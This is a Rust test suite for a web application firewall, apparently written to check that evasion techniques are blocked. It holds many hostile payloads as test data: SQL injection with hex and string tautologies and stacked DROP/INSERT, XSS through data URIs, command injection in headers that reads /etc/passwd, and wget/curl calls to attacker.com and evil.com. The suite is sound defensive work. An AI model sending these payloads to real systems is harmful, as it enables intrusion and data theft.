//! Adversarial WAF tests — designed to CATCH bypasses, not confirm happy paths.
//!
//! Each test exercises a specific evasion technique. If a test passes it means
//! the WAF correctly blocked the attack. **Failures indicate real vulnerabilities.**

use std::net::{IpAddr, Ipv4Addr};
use waf_engine::{HttpRequest, WafConfig, WafDecision, WafEngine};

// ── Helpers ──────────────────────────────────────────────────────────────────

fn engine() -> WafEngine {
    WafEngine::new(WafConfig::default())
}

fn engine_with_path_allowlist(paths: Vec<String>) -> WafEngine {
    let mut cfg = WafConfig::default();
    cfg.allowlist_paths = paths;
    WafEngine::new(cfg)
}

fn engine_with_ip_allowlist(ips: Vec<String>) -> WafEngine {
    let mut cfg = WafConfig::default();
    cfg.allowlist_ips = ips;
    WafEngine::new(cfg)
}

fn client_ip() -> IpAddr {
    IpAddr::V4(Ipv4Addr::new(1, 2, 3, 4))
}

fn allowlisted_ip() -> IpAddr {
    IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))
}

fn is_blocked(engine: &WafEngine, req: &HttpRequest<'_>) -> bool {
    matches!(engine.inspect(req).decision, WafDecision::Block(_))
}

// ── SQL Injection evasion tests ───────────────────────────────────────────────

/// P0 regression:`UNION ALL SELECT` MUST be blocked.
/// Before the fix, the 2-token window only checked [UNION, SELECT],
/// so inserting ALL in between bypassed detection entirely.
#[test]
fn test_sqli_union_all_select_bypass_regression() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/search",
        query_string: Some("q=1+UNION+ALL+SELECT+null,null,null --"),
        headers: &[],
        body: None,
    };
    assert!(is_blocked(&e, &req), "UNION ALL SELECT must be blocked — P0 regression");
}

/// Basic UNION SELECT (2-token, no ALL).
#[test]
fn test_sqli_union_select() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/login",
        query_string: None,
        headers: &[],
        body: Some("user=admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users --"),
    };
    assert!(is_blocked(&e, &req), "Comment-padded UNION SELECT must be blocked");
}

/// Case variation:`uNiOn AlL sElEcT`.
#[test]
fn test_sqli_union_all_select_mixed_case() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/api",
        query_string: Some("id=1+uNiOn+AlL+sElEcT+1,2,3 --"),
        headers: &[],
        body: None,
    };
    assert!(is_blocked(&e, &req), "Mixed-case UNION ALL SELECT must be blocked");
}

/// Tautology injection:`1=1`.
#[test]
fn test_sqli_tautology() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/users",
        query_string: Some("id=1+OR+1=1"),
        headers: &[],
        body: None,
    };
    assert!(is_blocked(&e, &req), "OR 1=1 tautology must be blocked");
}

/// Stacked queries.
#[test]
fn test_sqli_stacked_query() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/update",
        query_string: None,
        headers: &[],
        body: Some("id=1;DROP TABLE users --"),
    };
    assert!(is_blocked(&e, &req), "Stacked query must be blocked");
}

// ── Allowlist bypass tests ────────────────────────────────────────────────────

/// P1 regression:path allowlist must NOT skip query param inspection.
/// Before the fix `/health?id=1+OR+1=1` scored 0. Now it should be blocked.
#[test]
fn test_path_allowlist_does_not_bypass_query_params_regression() {
    let e = engine_with_path_allowlist(vec!["/health".to_string()]);
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/health",
        query_string: Some("id=1+OR+1=1"),
        headers: &[],
        body: None,
    };
    assert!(
        is_blocked(&e, &req),
        "Path allowlist must NOT bypass query param inspection — P1 regression"
    );
}

/// Path allowlist must NOT skip body inspection either.
#[test]
fn test_path_allowlist_does_not_bypass_body() {
    let e = engine_with_path_allowlist(vec!["/api/health".to_string()]);
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/api/health",
        query_string: None,
        headers: &[],
        body: Some("payload=<script>alert(1)</script>"),
    };
    assert!(is_blocked(&e, &req), "Path allowlist must NOT bypass body inspection");
}

/// IP allowlist IS a full bypass (trusted internal traffic).
#[test]
fn test_ip_allowlist_is_full_bypass() {
    let ip = allowlisted_ip();
    let ip_str = ip.to_string();
    let e = engine_with_ip_allowlist(vec![ip_str]);
    let req = HttpRequest {
        client_ip: ip,
        method: "GET",
        path: "/internal",
        query_string: Some("id=1+UNION+ALL+SELECT+null --"),
        headers: &[],
        body: None,
    };
// IP-allowlisted traffic gets a full bypass (scanner, health-checker)
    let info = e.inspect(&req);
    assert!(
        !matches!(info.decision, WafDecision::Block(_)),
        "IP-allowlisted clients must be fully bypassed"
    );
}

// ── XSS / Encoding bypass tests ───────────────────────────────────────────────

/// Raw `<script>` tag.
#[test]
fn test_xss_script_tag() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/comment",
        query_string: None,
        headers: &[],
        body: Some("body=<script>document.cookie</script>"),
    };
    assert!(is_blocked(&e, &req), "Raw XSS <script> must be blocked");
}

/// URL-encoded `%3Cscript%3E`.
#[test]
fn test_xss_url_encoded() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/search",
        query_string: Some("q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
        headers: &[],
        body: None,
    };
    assert!(is_blocked(&e, &req), "URL-encoded XSS must be blocked after decoding");
}

/// `javascript:` URI.
#[test]
fn test_xss_javascript_uri() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/redirect",
        query_string: Some("url=javascript:alert(document.domain)"),
        headers: &[],
        body: None,
    };
    assert!(is_blocked(&e, &req), "javascript: URI must be blocked");
}

// ── Command injection via headers ─────────────────────────────────────────────

/// Command injection injected into User-Agent header (P1 fix regression).
/// Before the fix, headers were only checked for SQL/XSS, not CMDI.
#[test]
fn test_cmdi_in_user_agent_header_regression() {
    let e = engine();
    let headers = vec![
        ("User-Agent".to_string(), "curl/7.68; $(cat /etc/passwd)".to_string()),
    ];
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/api/status",
        query_string: None,
        headers: &headers,
        body: None,
    };
    assert!(
        is_blocked(&e, &req),
        "Command injection in User-Agent header must be blocked — P1 regression"
    );
}

/// Command injection in X-Forwarded-For header.
#[test]
fn test_cmdi_in_x_forwarded_for() {
    let e = engine();
    let headers = vec![
        ("X-Forwarded-For".to_string(), "127.0.0.1 | whoami".to_string()),
    ];
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/",
        query_string: None,
        headers: &headers,
        body: None,
    };
    assert!(is_blocked(&e, &req), "Command injection in X-Forwarded-For must be blocked");
}

// ── Clean requests must NOT be blocked (false-positive guard) ─────────────────

#[test]
fn test_clean_request_not_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/api/users",
        query_string: Some("page=1&limit=20&sort=name"),
        headers: &[
            ("Accept".to_string(), "application/json".to_string()),
            ("User-Agent".to_string(), "Mozilla/5.0 (compatible)".to_string()),
        ],
        body: None,
    };
    assert!(!is_blocked(&e, &req), "Clean legitimate request must NOT be blocked");
}

// ── CMDI no-space bypass regressions (P1 fix) ────────────────────────────────
// Before the fix, every metachar check required a trailing space ("| ", "& ").
// Attackers routinely omit the space:`|whoami`, `&cat /etc/passwd`.
// All tests below would have PASSED (attack allowed through) before the patch.

/// `|whoami` — pipe directly followed by command, no space.
#[test]
fn test_cmdi_pipe_nospace_whoami_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/ping",
        query_string: Some("host=8.8.8.8|whoami"),
        headers: &[],
        body: None,
    };
    assert!(
        is_blocked(&e, &req),
        "`|whoami` (no space after pipe) must be blocked — P1 regression"
    );
}

/// `&cat /etc/passwd` — ampersand followed by cat immediately.
#[test]
fn test_cmdi_amp_nospace_cat_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/exec",
        query_string: None,
        headers: &[],
        body: Some("cmd=ls&cat /etc/passwd"),
    };
    assert!(
        is_blocked(&e, &req),
        "`&cat /etc/passwd` (no space after amp) must be blocked — P1 regression"
    );
}

/// `||wget` — double-pipe followed by wget immediately (OR-chain download).
#[test]
fn test_cmdi_double_pipe_wget_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/api/resolve",
        query_string: Some("host=example.com||wget http://attacker.com/shell.sh"),
        headers: &[],
        body: None,
    };
    assert!(
        is_blocked(&e, &req),
        "`||wget ...` (no space) must be blocked — P1 regression"
    );
}

/// `&&curl` — AND-chain with curl exfiltration attempt, no space.
#[test]
fn test_cmdi_double_amp_curl_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/lookup",
        query_string: None,
        headers: &[],
        body: Some("domain=corp.internal&&curl http://evil.com/steal?d=$(cat /etc/hostname)"),
    };
    assert!(
        is_blocked(&e, &req),
        "`&&curl ...` (no space) must be blocked"
    );
}

/// False-positive guard:pipes in non-dangerous context must NOT be blocked.
/// `report|summary` contains `|` but `summary` is not a dangerous command.
#[test]
fn test_cmdi_pipe_nondangerous_not_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/api/data",
        query_string: Some("view=report|summary&page=1"),
        headers: &[],
        body: None,
    };
    assert!(
        !is_blocked(&e, &req),
        "`|summary` — pipe before non-command word must NOT be blocked (false-positive guard)"
    );
}

// ── SQL hex literal tautology bypass regressions ─────────────────────────────
// Before the fix, `0x31` lexed as NumberLiteral(0) + Identifier(x31).
// The tautology check never fired because no two equal NumberLiterals appeared.
// After the fix hex literals parse to their numeric value (0x31 → 49.0).

/// `0x31=0x31` — both sides are hex 49; should be caught as tautology.
#[test]
fn test_sqli_hex_tautology_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/products",
        query_string: Some("id=1'+OR+0x31=0x31 --"),
        headers: &[],
        body: None,
    };
    assert!(
        is_blocked(&e, &req),
        "`' OR 0x31=0x31 --` hex tautology must be blocked — hex literal parsing regression"
    );
}

/// `0xFF=0xFF` — hex 255 equals hex 255; same bypass in body.
#[test]
fn test_sqli_hex_tautology_0xff_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/auth",
        query_string: None,
        headers: &[],
        body: Some("user=admin'/**/OR/**/0xFF=0xFF --&pass=x"),
    };
    assert!(
        is_blocked(&e, &req),
        "`' OR 0xFF=0xFF --` hex tautology in body must be blocked"
    );
}

// ── SQL stacked query interleaved-token bypass regressions ────────────────────
// Before the fix, detect_stacked_queries used a 2-token window:[Semicolon, DROP].
// Inserting a parenthesis `; (DROP ...)` caused the window to see [Semicolon, OpenParen]
// which didn't match, then [OpenParen, DROP] which also didn't match.
// The forward-scan state machine now catches any dangerous keyword AFTER a semicolon.

/// `'; (DROP TABLE users) --` — paren between semicolon and DROP.
#[test]
fn test_sqli_stacked_paren_drop_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/admin/delete",
        query_string: None,
        headers: &[],
        body: Some("id=1'; (DROP TABLE users) --"),
    };
    assert!(
        is_blocked(&e, &req),
        "`'; (DROP TABLE users) --` paren-wrapped stacked DROP must be blocked — stacked query regression"
    );
}

/// `'; (INSERT INTO admin_users ...) --` — insert via stacked paren.
#[test]
fn test_sqli_stacked_paren_insert_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/profile",
        query_string: None,
        headers: &[],
        body: Some("name=alice'; (INSERT INTO admin_users VALUES('hacker','pwned')) --"),
    };
    assert!(
        is_blocked(&e, &req),
        "`'; (INSERT INTO ...) --` paren-wrapped stacked INSERT must be blocked"
    );
}

/// `'; SELECT * FROM secrets --` — stacked SELECT (data exfiltration).
#[test]
fn test_sqli_stacked_select_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/api/item",
        query_string: Some("id=5'; SELECT password FROM users --"),
        headers: &[],
        body: None,
    };
    assert!(
        is_blocked(&e, &req),
        "`'; SELECT ...` stacked SELECT must be blocked"
    );
}

// ── XSS data:URI with JavaScript MIME type bypass regressions ───────────────
// Before the fix only `data:text/html` was in the data:URI blocklist.
// `data:text/javascript` and `data:application/javascript` were allowed through.

/// `<a href="data:text/javascript,alert(1)">` — JS payload via data URI.
#[test]
fn test_xss_data_text_javascript_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/comment",
        query_string: None,
        headers: &[],
        body: Some(r#"content=<a href="data:text/javascript,alert(document.domain)">click me</a>"#),
    };
    assert!(
        is_blocked(&e, &req),
        "`data:text/javascript,alert(...)` must be blocked — data URI JS bypass regression"
    );
}

/// `<img src="data:application/javascript,alert(1)">` — app/js MIME.
#[test]
fn test_xss_data_application_javascript_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/render",
        query_string: Some("tpl=<img+src=\"data:application/javascript,fetch('https://evil.com/?c='+document.cookie)\">"),
        headers: &[],
        body: None,
    };
    assert!(
        is_blocked(&e, &req),
        "`data:application/javascript,...` must be blocked"
    );
}

/// `data:text/vbscript` — legacy IE VBScript via data URI.
#[test]
fn test_xss_data_vbscript_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/feedback",
        query_string: None,
        headers: &[],
        body: Some("url=data:text/vbscript,MsgBox(\"XSS\")"),
    };
    assert!(
        is_blocked(&e, &req),
        "`data:text/vbscript,...` must be blocked"
    );
}

// ── SQL string comparison tautology bypass regressions ───────────────────────
// Before the fix, `detect_tautology` only caught Str=Str with equal values.
// `'z'>'a'` (always true lexicographically) and `'a'!='b'` slipped through.

/// `' OR 'z'>'a' --` — string comparison that is always true.
#[test]
fn test_sqli_string_tautology_gt_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/search",
        query_string: Some("q=alice'+OR+'z'>'a' --"),
        headers: &[],
        body: None,
    };
    assert!(
        is_blocked(&e, &req),
        "`' OR 'z'>'a' --` string comparison tautology must be blocked — string tautology regression"
    );
}

/// `' OR 'Z'>='A' --` — uppercase string comparison tautology.
#[test]
fn test_sqli_string_tautology_gte_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/login",
        query_string: None,
        headers: &[],
        body: Some("user=admin'+OR+'Z'>='A' --&pass=anything"),
    };
    assert!(
        is_blocked(&e, &req),
        "`' OR 'Z'>='A' --` GTE string tautology must be blocked"
    );
}

/// `' OR 'x'!='y' --` — inequality between two string literals (always matches some row).
#[test]
fn test_sqli_string_tautology_neq_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "GET",
        path: "/api/records",
        query_string: Some("filter=active'+OR+'x'!='y' --"),
        headers: &[],
        body: None,
    };
    assert!(
        is_blocked(&e, &req),
        "`' OR 'x'!='y' --` NEQ string tautology must be blocked"
    );
}

/// `' OR 'admin'='admin' --` — equal strings (existing logic, regression guard).
#[test]
fn test_sqli_string_tautology_eq_same_blocked() {
    let e = engine();
    let req = HttpRequest {
        client_ip: client_ip(),
        method: "POST",
        path: "/auth",
        query_string: None,
        headers: &[],
        body: Some("pass=x'+OR+'admin'='admin' --"),
    };
    assert!(
        is_blocked(&e, &req),
        "`' OR 'admin'='admin' --` equal string tautology must still be blocked"
    );
}

